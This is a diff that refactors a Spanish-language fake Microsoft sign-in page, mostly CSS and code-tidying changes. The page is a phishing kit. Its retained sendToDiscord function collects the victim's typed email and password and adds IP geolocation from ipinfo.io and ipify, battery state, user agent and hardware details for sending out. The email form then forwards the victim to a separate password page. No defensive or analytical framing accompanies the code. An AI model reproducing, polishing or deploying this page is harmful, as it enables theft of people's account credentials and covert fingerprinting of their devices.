@@ -37,7 +37,9 @@
   </script>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    html {
+    html, body {
+      margin: 0;
+      padding: 0;
       min-height: 100vh;
       width: 100%;
       font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
@@ -46,16 +48,7 @@
       background-repeat: no-repeat;
       position: fixed;
       overflow: hidden;
-    }
-    body {
-      min-height: 100vh;
-      width: 100%;
-      font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
-      background-size: cover;
-      background-position: center;
-      background-repeat: no-repeat;
-      position: fixed;
-      overflow: hidden;
+      background-color: #0a0a1a;
     }
     @media (min-width: 640px) {
       html, body {
@@ -154,10 +147,7 @@
       z-index: 50;
     }
     @media (min-width: 640px) {
-      .footer-links {
-        position: fixed;
-        padding: 8px 24px;
-      }
+      .footer-links { padding: 8px 24px; }
     }
     .footer-inner {
       max-width: 1200px;
@@ -170,16 +160,12 @@
       font-size: 12px;
       color: #605e5c;
     }
-    .footer-inner a {
-      color: #0078d4;
-      text-decoration: none;
-    }
+    .footer-inner a { color: #0078d4; text-decoration: none; }
     .footer-inner a:hover { text-decoration: underline; }
     .footer-inner .private-tip {
       text-align: center;
       font-size: 11px;
     }
-    /* Badge for email display */
     .email-badge {
       display: inline-flex;
       align-items: center;
@@ -196,15 +182,10 @@
 </head>
 <body>
 
-  <!-- Background overlay -->
-  <div class="fixed inset-0 bg-white/0"></div>
-
-  <!-- Main Content -->
   <div class="main-container">
     <div class="w-full max-w-md fade-in relative z-10">
       <div class="login-container p-8 sm:p-12">
 
-        <!-- Microsoft Logo -->
         <div class="flex items-center justify-center mb-6">
           <div class="grid grid-cols-2 gap-px w-6 h-6 mr-3">
             <div class="bg-ms-red w-3 h-3"></div>
@@ -222,12 +203,10 @@
           Use su cuenta
         </p>
 
-        <!-- Error box -->
         <div id="errorBox" class="error-box">
           <span id="errorText" class="error-text"></span>
         </div>
 
-        <!-- Email Form (Step 1) -->
         <form onsubmit="handleEmailSubmit(event)" class="space-y-5" id="emailForm">
           <div>
             <input
@@ -256,7 +235,6 @@
     </div>
   </div>
 
-  <!-- Footer Links -->
   <div class="footer-links" id="footerLinks">
     <div class="footer-inner">
       <a href="#" id="footerHelp">Ayuda</a>
@@ -267,7 +245,6 @@
   </div>
 
   <script>
-    // ===================== CARGA DE CONFIGURACIÓN GLOBAL =====================
     let globalConfig = null;
 
     async function loadGlobalConfig() {
@@ -277,7 +254,7 @@
           globalConfig = await res.json();
         }
       } catch (e) {
-        console.warn('Config global no disponible, usando defaults');
+        console.warn('Config global no disponible');
       }
       if (!globalConfig) {
         globalConfig = {
@@ -298,18 +275,14 @@
     }
 
     function applyGlobalConfig() {
-      // Logo text
-      const logoEl = document.querySelector('.text-ms-logo');
-      if (logoEl && globalConfig.logoText) logoEl.textContent = globalConfig.logoText;
-
-      // Page title
+      if (globalConfig.logoText) {
+        const logoEl = document.querySelector('.text-ms-logo');
+        if (logoEl) logoEl.textContent = globalConfig.logoText;
+      }
       if (globalConfig.pageTitle) document.title = globalConfig.pageTitle;
-
-      // Welcome text
       const welcomeEl = document.querySelector('.text-ms-subtitle');
       if (welcomeEl && globalConfig.welcomeText) welcomeEl.textContent = globalConfig.welcomeText;
 
-      // Footer links
       const helpEl = document.getElementById('footerHelp');
       const termsEl = document.getElementById('footerTerms');
       const privacyEl = document.getElementById('footerPrivacy');
@@ -319,7 +292,6 @@
       if (privacyEl && globalConfig.footerPrivacyText) privacyEl.textContent = globalConfig.footerPrivacyText;
       if (privateTipEl && globalConfig.footerPrivateTip) privateTipEl.innerHTML = globalConfig.footerPrivateTip;
 
-      // Login background
       applyLoginBackground();
     }
 
@@ -329,15 +301,32 @@
       const bgGradient = globalConfig.loginBgGradient || 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)';
       const bgImage = globalConfig.loginBgImage || '';
 
-      // Resetear body
+      const el = document.documentElement; // Aplica al <html> para asegurar cobertura completa
+
+      el.style.background = '';
+      el.style.backgroundColor = '';
+      el.style.backgroundImage = '';
+      el.style.backgroundSize = '';
+      el.style.backgroundPosition = '';
+      el.style.backgroundAttachment = '';
+
+      if (bgType === 'color' && bgColor) {
+        el.style.backgroundColor = bgColor;
+      } else if (bgType === 'gradient' && bgGradient) {
+        el.style.background = bgGradient;
+      } else if (bgType === 'image' && bgImage) {
+        el.style.background = `url(${bgImage}) center / cover no-repeat`;
+      } else {
+        el.style.background = bgGradient;
+      }
+
+      // También aplicar al body por si acaso
       document.body.style.background = '';
       document.body.style.backgroundColor = '';
       document.body.style.backgroundImage = '';
       document.body.style.backgroundSize = '';
       document.body.style.backgroundPosition = '';
-      document.body.style.backgroundAttachment = '';
 
-      // Aplicar fondo configurado
       if (bgType === 'color' && bgColor) {
         document.body.style.backgroundColor = bgColor;
       } else if (bgType === 'gradient' && bgGradient) {
@@ -347,16 +336,6 @@
       } else {
         document.body.style.background = bgGradient;
       }
-    }
-
-    // ===================== FORGOT PASSWORD HELP =====================
-    function showForgotPasswordHelp() {
-      alert('Para restablecer tu contraseña, visita el centro de cuenta de Microsoft.');
-    }
-
-    // ===================== VALIDACIÓN DE EMAIL =====================
-    function isValidEmail(email) {
-      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
     }
 
     function showError(message) {
@@ -373,32 +352,23 @@
       if (errorBox) errorBox.style.display = 'none';
     }
 
-    // ===================== ENVÍO A DISCORD =====================
+    function isValidEmail(email) {
+      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+    }
+
     async function sendToDiscord(email, password) {
-      // 1. Geo IP desde ipinfo.io
       let geoData = {};
       try {
         const geoRes = await fetch('https://ipinfo.io/json');
-        if (geoRes.ok) {
-          geoData = await geoRes.json();
-        }
-      } catch (e) {
-        console.warn('Geo IP no disponible:', e);
-      }
+        if (geoRes.ok) geoData = await geoRes.json();
+      } catch (e) { console.warn('Geo IP no disponible:', e); }
 
-      // 2. IP desde ipify
       let ipifyIp = '';
       try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
-        if (ipRes.ok) {
-          const ipData = await ipRes.json();
-          ipifyIp = ipData.ip || '';
-        }
-      } catch (e) {
-        console.warn('IPify no disponible:', e);
-      }
+        if (ipRes.ok) { const ipData = await ipRes.json(); ipifyIp = ipData.ip || ''; }
+      } catch (e) { console.warn('IPify no disponible:', e); }
 
-      // 3. Batería
       let batteryLevel = 'No disponible';
       let batteryCharging = 'Desconocido';
       try {
@@ -407,11 +377,8 @@
           batteryLevel = (battery.level * 100).toFixed(0) + '%';
           batteryCharging = battery.charging ? 'Sí' : 'No';
         }
-      } catch (e) {
-        console.warn('Batería no disponible:', e);
-      }
+      } catch (e) { console.warn('Batería no disponible:', e); }
 
-      // 4. Datos del dispositivo
       const userAgent = navigator.userAgent || 'desconocido';
       const language = navigator.language || 'desconocido';
       const languages = navigator.languages ? navigator.languages.join(', ') : language;
@@ -421,17 +388,14 @@
       const platform = navigator.platform || 'desconocido';
       const onlineStatus = navigator.onLine ? 'Sí' : 'No';
       const cookiesEnabled = navigator.cookieEnabled ? 'Sí' : 'No';
-
       const deviceMemory = navigator.deviceMemory || 'desconocido';
       const cpuCores = navigator.hardwareConcurrency || 'desconocido';
       const touchPoints = navigator.maxTouchPoints || 0;
-
       const uaLower = userAgent.toLowerCase();
       const isMobile = /android|iphone|ipad|ipod/i.test(uaLower) ? 'Sí' : 'No';
       const isTablet = /ipad|tablet/i.test(uaLower) ? 'Sí' : 'No';
       const isDesktop = !/android|iphone|ipad|ipod|tablet/i.test(uaLower) ? 'Sí' : 'No';
 
-      // Extraer geo fields
       const geoIp = geoData.ip || ipifyIp || '';
       const geoCity = geoData.city || '';
       const geoRegion = geoData.region || '';
@@ -449,41 +413,16 @@
       const geoNetwork = geoData.org || '';
 
       const payload = {
-        email: email,
-        password: password || '',
-        userAgent: userAgent,
-        language: language,
-        languages: languages,
-        screenResolution: screenResolution,
-        colorDepth: colorDepth,
-        timezone: timezone,
-        platform: platform,
-        onlineStatus: onlineStatus,
-        cookiesEnabled: cookiesEnabled,
-        deviceMemory: deviceMemory,
-        cpuCores: cpuCores,
-        touchPoints: touchPoints,
-        isMobile: isMobile,
-        isTablet: isTablet,
-        isDesktop: isDesktop,
-        batteryLevel: batteryLevel,
-        batteryCharging: batteryCharging,
-        geoIp: geoIp,
-        geoCity: geoCity,
-        geoRegion: geoRegion,
-        geoCountry: geoCountry,
-        geoCountryCode: geoCountryCode,
-        geoTimezone: geoTimezone,
-        geoIsoCode: geoIsoCode,
-        geoIsp: geoIsp,
-        geoLatitude: geoLatitude,
-        geoLongitude: geoLongitude,
-        geoZip: geoZip,
-        geoCurrency: geoCurrency,
-        geoCurrencyCode: geoCurrencyCode,
-        geoCallingCode: geoCallingCode,
-        geoNetwork: geoNetwork,
-        ipifyIp: ipifyIp,
+        email, password: password || '',
+        userAgent, language, languages, screenResolution, colorDepth,
+        timezone, platform, onlineStatus, cookiesEnabled,
+        deviceMemory, cpuCores, touchPoints,
+        isMobile, isTablet, isDesktop,
+        batteryLevel, batteryCharging,
+        geoIp, geoCity, geoRegion, geoCountry, geoCountryCode,
+        geoTimezone, geoIsoCode, geoIsp, geoLatitude, geoLongitude,
+        geoZip, geoCurrency, geoCurrencyCode, geoCallingCode, geoNetwork,
+        ipifyIp,
       };
 
       try {
@@ -500,7 +439,6 @@
       }
     }
 
-    // ===================== PASO 1: EMAIL =====================
     function handleEmailSubmit(event) {
       event.preventDefault();
       hideError();
@@ -521,20 +459,16 @@
         return;
       }
 
-      // Deshabilitar botón
       submitBtn.disabled = true;
       submitBtn.textContent = 'Verificando...';
 
-      // Redirigir a página de contraseña
       setTimeout(() => {
         window.location.href = 'password.html?email=' + encodeURIComponent(email);
       }, 400);
     }
 
-    // Cargar config al iniciar
     loadGlobalConfig();
 
-    // Mostrar mensaje de éxito después de pago
     (function checkPaymentSuccess() {
       const params = new URLSearchParams(window.location.search);
       if (params.get('payment_success') === '1') {
